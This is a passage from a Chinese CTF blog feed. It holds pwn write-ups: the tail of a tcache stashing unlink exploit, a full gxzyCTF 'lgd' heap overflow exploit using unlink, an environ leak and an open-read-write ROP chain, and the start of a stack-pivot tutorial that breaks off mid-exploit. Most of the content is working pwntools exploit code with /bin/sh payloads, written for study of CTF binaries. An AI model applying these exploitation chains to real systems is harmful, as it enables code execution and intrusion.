class="string">"./twochunk"</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    <span class="keyword">print</span> <span class="string">"remote"</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span><span class="params">(idx,size)</span>:</span></span><br><span class="line">    s(<span class="string">"choice: "</span>,str(<span class="number">1</span>))</span><br><span class="line">    s(<span class="string">"idx: "</span>,str(idx))</span><br><span class="line">    s(<span class="string">"size: "</span>,str(size))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">free</span><span class="params">(idx)</span>:</span></span><br><span class="line">    s(<span class="string">"choice: "</span>,str(<span class="number">2</span>))</span><br><span class="line">    s(<span class="string">"idx: "</span>,str(idx))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show</span><span class="params">(idx)</span>:</span></span><br><span class="line">    s(<span class="string">"choice: "</span>,str(<span class="number">3</span>))</span><br><span class="line">    s(<span class="string">"idx: "</span>,str(idx))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit</span><span class="params">(idx,content)</span>:</span></span><br><span class="line">    s(<span class="string">"choice: "</span>,str(<span class="number">4</span>))</span><br><span class="line">    s(<span class="string">"idx: "</span>,str(idx))</span><br><span class="line">    s(<span class="string">"content: "</span>,content)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">leave_msg</span><span class="params">(msg)</span>:</span></span><br><span class="line">    s(<span class="string">"choice: "</span>,str(<span class="number">6</span>))</span><br><span class="line">    s(<span class="string">"message: "</span>,msg)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">gd</span><span class="params">()</span>:</span></span><br><span class="line">    gdb.attach(p)</span><br><span class="line">s(<span class="string">'name: '</span>,p64(<span class="number">0x23333020</span>)*<span class="number">6</span>)    </span><br><span class="line">s(<span class="string">'message: '</span>,p64(<span class="number">0x23333020</span>)*<span class="number">8</span>) </span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">5</span>):</span><br><span class="line">    add(<span class="number">0</span>,<span class="number">0x88</span>)</span><br><span class="line">    free(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">7</span>):</span><br><span class="line">    add(<span class="number">0</span>,<span class="number">0x190</span>)</span><br><span class="line">    free(<span class="number">0</span>)</span><br><span class="line"><span class="comment">#make two small bin</span></span><br><span class="line">add(<span class="number">0</span>,<span class="number">0x190</span>)</span><br><span class="line">add(<span class="number">1</span>,<span class="number">0x1a0</span>)</span><br><span class="line">free(<span class="number">0</span>)</span><br><span class="line">add(<span class="number">0</span>,<span class="number">0x100</span>)</span><br><span class="line">free(<span class="number">1</span>)</span><br><span class="line">free(<span class="number">0</span>)</span><br><span class="line">add(<span class="number">0</span>,<span class="number">0xf0</span>)</span><br><span class="line">free(<span class="number">0</span>)</span><br><span class="line">add(<span class="number">0</span>,<span class="number">0xf0</span>)</span><br><span class="line">free(<span class="number">0</span>)</span><br><span class="line">add(<span class="number">0</span>,<span class="number">0x190</span>)</span><br><span class="line">add(<span class="number">1</span>,<span class="number">0x1a0</span>)</span><br><span class="line">free(<span class="number">0</span>)</span><br><span class="line">add(<span class="number">0</span>,<span class="number">0x100</span>)</span><br><span class="line">free(<span class="number">1</span>)</span><br><span class="line">free(<span class="number">0</span>)</span><br><span class="line">add(<span class="number">0</span>,<span class="number">0x190</span>)</span><br><span class="line">free(<span class="number">0</span>)</span><br><span class="line">add(<span class="number">0</span>,<span class="number">23333</span>)</span><br><span class="line">show(<span class="number">0</span>)</span><br><span class="line">heap = u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">'\x00'</span>))</span><br><span class="line">log.success(<span class="string">"heap:"</span>+hex(heap))</span><br><span class="line">payload = <span class="string">'\x00'</span>*<span class="number">0xf0</span>+p64(<span class="number">0</span>)+p64(<span class="number">0x111</span>)+<span class="string">'\x00'</span>*<span class="number">0x100</span>+p64(<span class="number">0</span>)+p64(<span class="number">0x91</span>)+p64(heap<span class="number">-0x250</span>)+p64(<span class="number">0x23333000</span><span class="number">-0x10</span>)</span><br><span class="line">edit(<span class="number">0</span>,payload)</span><br><span class="line">add(<span class="number">1</span>,<span class="number">0x88</span>)</span><br><span class="line">s(<span class="string">"choice: "</span>,str(<span class="number">5</span>))</span><br><span class="line">r(<span class="string">"message: "</span>)</span><br><span class="line">libc_base = u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">'\x00'</span>))<span class="number">-0x1eac60</span></span><br><span class="line">log.success(<span class="string">"libc_base:"</span>+hex(libc_base))</span><br><span class="line">payload = p64(libc_base+libc.symbols[<span class="string">'execve'</span>])</span><br><span class="line">payload += p64(<span class="number">0</span>)*<span class="number">5</span>+p64(libc_base+libc.search(<span class="string">'/bin/sh'</span>).next())+p64(<span class="number">0</span>)+p64(<span class="number">0</span>)</span><br><span class="line">leave_msg(payload)</span><br><span class="line"><span class="comment"># gd()</span></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h3 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h3&gt;&lt;p&gt;tcache_stashing_unlink_attack是glibc2.29和glibc2.30下的一种新型攻击技巧&lt;/p&gt;
&lt;h3 id
      
    
    </summary>
    
      <category term="pwn学习" scheme="https://j-kangel.github.io/categories/pwn%E5%AD%A6%E4%B9%A0/"/>
    
    
      <category term="pwn" scheme="https://j-kangel.github.io/tags/pwn/"/>
    
      <category term="gxzy" scheme="https://j-kangel.github.io/tags/gxzy/"/>
    
  </entry>
  
  <entry>
    <title>gxzyCTF pwn lgd</title>
    <link href="https://j-kangel.github.io/2020/04/09/gxzyCTF-pwn-lgd/"/>
    <id>https://j-kangel.github.io/2020/04/09/gxzyCTF-pwn-lgd/</id>
    <published>2020-04-09T11:37:42.000Z</published>
    <updated>2020-04-09T04:23:31.929Z</updated>
    
    <content type="html"><![CDATA[<h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><p>经典的glibc2.23环境下的堆溢出，程序自带混淆，可以通过简单的黑盒测试确定程序的逻辑。禁掉了execev，可以在栈上构造orw，也可以通过栈迁移打orw。这里利用unlink进行任意地址读写，然后利用environ泄露栈地址，然后在栈上构造orw的ROP链。</p><h3 id="黑盒测试"><a href="#黑盒测试" class="headerlink" title="黑盒测试"></a>黑盒测试</h3><h4 id="静态分析"><a href="#静态分析" class="headerlink" title="静态分析"></a>静态分析</h4><p>通过静态分析可以发现，程序存在add、free、show、edit四个功能。</p><p>add：可以malloc大小为[0,0x1000]的堆块，conten并没有直接写进heap，而是放在大小为0x200的bss段中</p><p>free：正常free，有清零</p><p>show：正常</p><p>edit：可以发现edit的大小存放在bss段中</p><h4 id="动态调试"><a href="#动态调试" class="headerlink" title="动态调试"></a>动态调试</h4><p>可以发现，edit的大小与堆的大小没有关系，而是等于content的长度，因此可以堆溢出</p><h3 id="泄露libc"><a href="#泄露libc" class="headerlink" title="泄露libc"></a>泄露libc</h3><p>有show，可以malloc smallbin，便可以泄露libc</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">sl(<span class="string">"name?"</span>,<span class="string">"kangel"</span>)</span><br><span class="line">add(<span class="number">0x80</span>,<span class="string">'0'</span>*<span class="number">0x200</span>)<span class="comment">#0</span></span><br><span class="line">add(<span class="number">0x10</span>,<span class="string">'1'</span>*<span class="number">0x200</span>)<span class="comment">#1</span></span><br><span class="line">free(<span class="number">0</span>)<span class="comment">#-1</span></span><br><span class="line">add(<span class="number">0x80</span>,<span class="string">'0'</span>*<span class="number">0x200</span>)<span class="comment">#1</span></span><br><span class="line">show(<span class="number">0</span>)</span><br></pre></td></tr></table></figure><h3 id="unlink"><a href="#unlink" class="headerlink" title="unlink"></a>unlink</h3><p>有smallbin和堆溢出，可以构造unlink</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">add(<span class="number">0x100</span>,<span class="string">'2'</span>*<span class="number">0x200</span>)<span class="comment">#2</span></span><br><span class="line">add(<span class="number">0x100</span>,<span class="string">'3'</span>*<span class="number">0x200</span>)<span class="comment">#3</span></span><br><span class="line">add(<span class="number">0x80</span>,<span class="string">'4'</span>*<span class="number">0x200</span>)<span class="comment">#4</span></span><br><span class="line">to_fake=<span class="number">0x6032e0</span>+<span class="number">0x10</span></span><br><span class="line">edit(<span class="number">2</span>,p64(<span class="number">0</span>)+p64(<span class="number">0x101</span>)+p64(to_fake<span class="number">-0x18</span>)+p64(to_fake<span class="number">-0x10</span>)+<span class="string">'\x00'</span>*<span class="number">0xe0</span>+p64(<span class="number">0x100</span>)+p64(<span class="number">0x110</span>))</span><br><span class="line">free(<span class="number">3</span>) <span class="comment">#-3 unlink</span></span><br></pre></td></tr></table></figure><p>堆布局如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; x/10gx 0x6032e0                                             </span><br><span class="line">0x6032e0:       0x0000000000db8010      0x0000000000db80a0</span><br><span class="line">0x6032f0:       0x0000000000db80c0      0x0000000000db81d0</span><br><span class="line">0x603300:       0x0000000000db82e0      0x0000000000000000</span><br><span class="line">0x603310:       0x0000000000000000      0x0000000000000000</span><br><span class="line">0x603320:       0x0000000000000000      0x0000000000000000</span><br><span class="line">pwndbg&gt; x/40gx 0x0000000000db80c0</span><br><span class="line">0xdb80c0:       0x0000000000000000      0x0000000000000101</span><br><span class="line">0xdb80d0:       0x00000000006032d8      0x00000000006032e0</span><br><span class="line">0xdb80e0:       0x0000000000000000      0x0000000000000000</span><br><span class="line">0xdb80f0:       0x0000000000000000      0x0000000000000000</span><br><span class="line">0xdb8100:       0x0000000000000000      0x0000000000000000</span><br><span class="line">0xdb8110:       0x0000000000000000      0x0000000000000000</span><br><span class="line">0xdb8120:       0x0000000000000000      0x0000000000000000</span><br><span class="line">0xdb8130:       0x0000000000000000      0x0000000000000000</span><br><span class="line">0xdb8140:       0x0000000000000000      0x0000000000000000</span><br><span class="line">0xdb8150:       0x0000000000000000      0x0000000000000000</span><br><span class="line">0xdb8160:       0x0000000000000000      0x0000000000000000</span><br><span class="line">0xdb8170:       0x0000000000000000      0x0000000000000000</span><br><span class="line">0xdb8180:       0x0000000000000000      0x0000000000000000</span><br><span class="line">0xdb8190:       0x0000000000000000      0x0000000000000000</span><br><span class="line">0xdb81a0:       0x0000000000000000      0x0000000000000000</span><br><span class="line">0xdb81b0:       0x0000000000000000      0x0000000000000000</span><br><span class="line">0xdb81c0:       0x0000000000000100      0x0000000000000110</span><br><span class="line">0xdb81d0:       0x0000000000000000      0x0000000000000000</span><br><span class="line">0xdb81e0:       0x0000000000000000      0x0000000000000000</span><br><span class="line">0xdb81f0:       0x0000000000000000      0x0000000000000000</span><br></pre></td></tr></table></figure><p>条件：bck-&gt;FD + 0x18 = bck ; bck-&gt;BK + 0x10 = bck</p><p>效果：bck = *bck - 0x18</p><h3 id="泄露栈地址"><a href="#泄露栈地址" class="headerlink" title="泄露栈地址"></a>泄露栈地址</h3><p>可以利用environ进行泄露</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">environ=libc_base+libc.symbols[<span class="string">'environ'</span>]</span><br><span class="line">edit(<span class="number">2</span>,p64(<span class="number">0</span>)+p64(environ))</span><br><span class="line">show(<span class="number">0</span>)</span><br><span class="line">stack = u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">'\x00'</span>))</span><br><span class="line">log.success(<span class="string">"stack:"</span>+hex(stack))</span><br><span class="line">rbp_addr=stack<span class="number">-0x228</span></span><br></pre></td></tr></table></figure><p>计算environ与edit函数中rbp的差值，因为利用edit往栈中写入数据后直接进行rop</p><p><img alt="" data-src="/2020/04/09/gxzyCTF-pwn-lgd/1.png" class="lazyload"></p><h3 id="orw"><a href="#orw" class="headerlink" title="orw"></a>orw</h3><p>直接往rbp中注入rop链即可</p><p>完整exp</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#coding=utf-8</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context.arch = <span class="string">'amd64'</span></span><br><span class="line">context.os = <span class="string">'linux'</span></span><br><span class="line">context.log_level = <span class="string">'debug'</span></span><br><span class="line">context.terminal = [<span class="string">'tmux'</span>,<span class="string">'split'</span>,<span class="string">'-h'</span>]</span><br><span class="line"></span><br><span class="line">elf = ELF(<span class="string">"./pwn"</span>)</span><br><span class="line">libc = ELF(<span class="string">"/lib/x86_64-linux-gnu/libc.so.6"</span>)</span><br><span class="line"></span><br><span class="line">r = <span class="keyword">lambda</span> x: p.recvuntil(x)</span><br><span class="line">s = <span class="keyword">lambda</span> x,y: p.sendafter(x,y)</span><br><span class="line">sl = <span class="keyword">lambda</span> x,y: p.sendlineafter(x,y)</span><br><span class="line"></span><br><span class="line">debug = <span class="number">1</span></span><br><span class="line"><span class="keyword">if</span> debug:</span><br><span class="line">    p = process(<span class="string">"./pwn"</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    <span class="keyword">print</span> <span class="string">"remote"</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span><span class="params">(size,content)</span>:</span></span><br><span class="line">    sl(<span class="string">"&gt;&gt; "</span>,str(<span class="number">1</span>))</span><br><span class="line">    sl(<span class="string">"______?\n"</span>,str(size))</span><br><span class="line">    s(<span class="string">"yes_or_no?\n"</span>,content)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">free</span><span class="params">(idx)</span>:</span></span><br><span class="line">    sl(<span class="string">"&gt;&gt; "</span>,str(<span class="number">2</span>))</span><br><span class="line">    sl(<span class="string">"index ?\n"</span>,str(idx))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show</span><span class="params">(idx)</span>:</span></span><br><span class="line">    sl(<span class="string">"&gt;&gt; "</span>,str(<span class="number">3</span>))</span><br><span class="line">    sl(<span class="string">"index ?\n"</span>,str(idx))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit</span><span class="params">(idx,content)</span>:</span></span><br><span class="line">    sl(<span class="string">"&gt;&gt; "</span>,str(<span class="number">4</span>)),<span class="number">0</span></span><br><span class="line">    sl(<span class="string">"index ?\n"</span>,str(idx))</span><br><span class="line">    s(<span class="string">"new_content ?\n"</span>,content)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">gd</span><span class="params">()</span>:</span></span><br><span class="line">    gdb.attach(p)</span><br><span class="line"></span><br><span class="line">sl(<span class="string">"name?"</span>,<span class="string">"kangel"</span>)</span><br><span class="line">add(<span class="number">0x80</span>,<span class="string">'0'</span>*<span class="number">0x200</span>)<span class="comment">#0</span></span><br><span class="line">add(<span class="number">0x10</span>,<span class="string">'1'</span>*<span class="number">0x200</span>)<span class="comment">#1</span></span><br><span class="line">free(<span class="number">0</span>)<span class="comment">#-1</span></span><br><span class="line">add(<span class="number">0x80</span>,<span class="string">'0'</span>*<span class="number">0x200</span>)<span class="comment">#1</span></span><br><span class="line">show(<span class="number">0</span>)</span><br><span class="line">libc_base = u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">'\x00'</span>)) - <span class="number">0x3c4b78</span></span><br><span class="line">log.success(<span class="string">"libc_base:"</span>+hex(libc_base))</span><br><span class="line">add(<span class="number">0x100</span>,<span class="string">'2'</span>*<span class="number">0x200</span>)<span class="comment">#2</span></span><br><span class="line">add(<span class="number">0x100</span>,<span class="string">'3'</span>*<span class="number">0x200</span>)<span class="comment">#3</span></span><br><span class="line">add(<span class="number">0x80</span>,<span class="string">'4'</span>*<span class="number">0x200</span>)<span class="comment">#4</span></span><br><span class="line">to_fake=<span class="number">0x6032e0</span>+<span class="number">0x10</span></span><br><span class="line">edit(<span class="number">2</span>,p64(<span class="number">0</span>)+p64(<span class="number">0x101</span>)+p64(to_fake<span class="number">-0x18</span>)+p64(to_fake<span class="number">-0x10</span>)+<span class="string">'\x00'</span>*<span class="number">0xe0</span>+p64(<span class="number">0x100</span>)+p64(<span class="number">0x110</span>))</span><br><span class="line">free(<span class="number">3</span>) <span class="comment">#-3 unlink</span></span><br><span class="line">environ=libc_base+libc.symbols[<span class="string">'environ'</span>]</span><br><span class="line">edit(<span class="number">2</span>,p64(<span class="number">0</span>)+p64(environ))</span><br><span class="line">show(<span class="number">0</span>)</span><br><span class="line">stack = u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">'\x00'</span>))</span><br><span class="line">log.success(<span class="string">"stack:"</span>+hex(stack))</span><br><span class="line">rbp_addr=stack<span class="number">-0x228</span></span><br><span class="line">edit(<span class="number">2</span>,p64(<span class="number">0</span>)+p64(rbp_addr))</span><br><span class="line">prdi = <span class="number">0x0000000000021102</span></span><br><span class="line">prsi = <span class="number">0x00000000000202e8</span></span><br><span class="line">prdx = <span class="number">0x0000000000001b92</span></span><br><span class="line">prdi = libc_base + prdi</span><br><span class="line">prsi = libc_base + prsi</span><br><span class="line">prdx = libc_base + prdx</span><br><span class="line">open = libc_base + libc.symbols[<span class="string">'open'</span>]</span><br><span class="line">read = libc_base + libc.symbols[<span class="string">'read'</span>]</span><br><span class="line">write = libc_base + libc.symbols[<span class="string">'write'</span>]</span><br><span class="line">rop = <span class="string">'./flag\x00\x00'</span></span><br><span class="line">rop += p64(prdi)</span><br><span class="line">rop += p64(rbp_addr)</span><br><span class="line">rop += p64(prsi)</span><br><span class="line">rop += p64(<span class="number">0</span>)</span><br><span class="line">rop += p64(open)</span><br><span class="line">rop += p64(prdi)</span><br><span class="line">rop += p64(<span class="number">0x3</span>)</span><br><span class="line">rop += p64(prsi)</span><br><span class="line">rop += p64(rbp_addr + <span class="number">0x500</span>)</span><br><span class="line">rop += p64(prdx)</span><br><span class="line">rop += p64(<span class="number">0x50</span>)</span><br><span class="line">rop += p64(read)</span><br><span class="line">rop += p64(prdi)</span><br><span class="line">rop += p64(<span class="number">1</span>)</span><br><span class="line">rop += p64(prsi)</span><br><span class="line">rop += p64(rbp_addr + <span class="number">0x500</span>)</span><br><span class="line">rop += p64(prdx)</span><br><span class="line">rop += p64(<span class="number">0x50</span>)</span><br><span class="line">rop += p64(write)</span><br><span class="line"><span class="comment">#print rop</span></span><br><span class="line"><span class="comment">#pause()</span></span><br><span class="line">gd()</span><br><span class="line">edit(<span class="number">0</span>,rop)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h3 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h3&gt;&lt;p&gt;经典的glibc2.23环境下的堆溢出，程序自带混淆，可以通过简单的黑盒测试确定程序的逻辑。禁掉了execev，可以在栈上构造orw，也可以
      
    
    </summary>
    
      <category term="pwn学习" scheme="https://j-kangel.github.io/categories/pwn%E5%AD%A6%E4%B9%A0/"/>
    
    
      <category term="pwn" scheme="https://j-kangel.github.io/tags/pwn/"/>
    
      <category term="gxzy" scheme="https://j-kangel.github.io/tags/gxzy/"/>
    
  </entry>
  
  <entry>
    <title>栈迁移的多种技巧</title>
    <link href="https://j-kangel.github.io/2020/04/09/%E6%A0%88%E8%BF%81%E7%A7%BB%E7%9A%84%E5%A4%9A%E7%A7%8D%E6%8A%80%E5%B7%A7/"/>
    <id>https://j-kangel.github.io/2020/04/09/栈迁移的多种技巧/</id>
    <published>2020-04-09T10:56:13.000Z</published>
    <updated>2020-06-05T12:03:53.942Z</updated>
    
    <content type="html"><![CDATA[<h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><p>当栈空间不够利用或者无法利用时，我们又需要利用rop的时候，栈迁移可以帮助我们。</p><p>下面介绍几种常见的栈迁移方法，持续更新！</p><h3 id="double-ret"><a href="#double-ret" class="headerlink" title="double ret"></a>double ret</h3><p>double ret就是通过将ebp覆盖成我们构造的fake_ebp ，然后利用<code>leave ; ret</code>这样的gadget将esp劫持到fake_ebp的地址上</p><h4 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h4><p>假设可以覆盖ebp</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">esp |          |</span><br><span class="line">    | ...      |</span><br><span class="line">ebp | fake_ebp |</span><br><span class="line">    | ...      |</span><br><span class="line">    |leave_ret |</span><br></pre></td></tr></table></figure><p>第一次<code>leave ; ret</code></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">mov esp; ebp</span><br><span class="line">pop ebp             #此时ebp的值为fake_ebp</span><br></pre></td></tr></table></figure><p>第二次<code>leave ; ret</code></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mov esp; ebp        #esp的值为fake_ebp</span><br></pre></td></tr></table></figure><h4 id="例题"><a href="#例题" class="headerlink" title="例题"></a>例题</h4><p>下面以ciscn_2019_es_2为例</p><p>checksec</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">[*] &apos;/mnt/hgfs/pwn/buuoj/es_2_stack_pivot/ciscn_2019_es_2&apos;         </span><br><span class="line">    Arch:     i386-32-little                                     </span><br><span class="line">    RELRO:    Partial RELRO                                  </span><br><span class="line">    Stack:    No canary found                            </span><br><span class="line">    NX:       NX enabled                                            </span><br><span class="line">    PIE:      No PIE (0x8048000)</span><br></pre></td></tr></table></figure><p>程序漏洞很明显，32位程序下有8字节的栈溢出，可以覆盖到ebp和函数返回地址</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">vul</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">char</span> s; <span class="comment">// [esp+0h] [ebp-28h]</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">memset</span>(&amp;s, <span class="number">0</span>, <span class="number">0x20</span>u);</span><br><span class="line">  read(<span class="number">0</span>, &amp;s, <span class="number">0x30</span>u);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"Hello, %s\n"</span>, &amp;s);</span><br><span class="line">  read(<span class="number">0</span>, &amp;s, <span class="number">0x30</span>u);</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">printf</span>(<span class="string">"Hello, %s\n"</span>, &amp;s);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>利用方式：</p><p>1、第一次read和printf可以泄露栈地址</p><p>2、第二次read可以进行栈迁移将栈压低，刚好可以利用vul函数的main函数的double ret</p><p>vul函数</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">.text:080485FD                 leave</span><br><span class="line">.text:080485FE                 retn</span><br></pre></td></tr></table></figure><p>main函数，需要注意的是main函数的返回稍有不同</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">.text:0804862F                 mov     ecx, [ebp+var_4]</span><br><span class="line">.text:08048632                 leave</span><br><span class="line">.text:08048633                 lea     esp, [ecx-4]</span><br><span class="line">.text:08048636                 retn</span><br></pre></td></tr></table></figure><p>栈布局</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; x/12wx $ebp-0x28</span><br><span class="line">0xff975d10:     0x61616161      0xff975d20      0x62626262      0x08048400</span><br><span class="line">0xff975d20:     0x63636363      0xff975d28      0x6e69622f      0x0068732f</span><br><span class="line">0xff975d30:     0x70707070      0x70707070      0xff975d18      0x0804862a</span><br></pre></td></tr></table></figure><p>exp</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.terminal = [<span class="string">'tmux'</span>,<span class="string">'split'</span>,<span class="string">'-h'</span>]</span><br><span class="line">p = process(<span class="string">'ciscn_2019_es_2'</span>)</span><br><span class="line"></span><br><span class="line">sys_plt=<span class="number">0x8048400</span> </span><br><span class="line"></span><br><span class="line">pl=<span class="string">'a'</span>*<span class="number">0x20</span>+<span class="string">'bbbbbbbb'</span></span><br><span class="line">p.send(pl)</span><br><span class="line">p.recvuntil(<span class="string">'b'</span>*<span class="number">8</span>)</span><br><span class="line">ebp1=u32(p.recv(<span class="number">4</span>))</span><br><span class="line">print(hex(ebp))</span><br><span class="line">ebp2 = ebp1 - <span class="number">0x10</span></span><br><span class="line">pl2=(<span class="string">'a'</span>*<span class="number">4</span>+p32(ebp<span class="number">-0x18</span>)+<span class="string">'bbbb'</span>+p32(sys_plt)+<span class="string">'cccc'</span>+p32(ebp<span class="number">-0x10</span>)+<span class="string">'/bin/sh\x00'</span>).ljust(<span class="number">0x28</span>,<span class="string">'d'</span>)+p32(ebp<span class="number">-0x20</span>)</span><br><span class="line">gdb.attach(p)</span><br><span 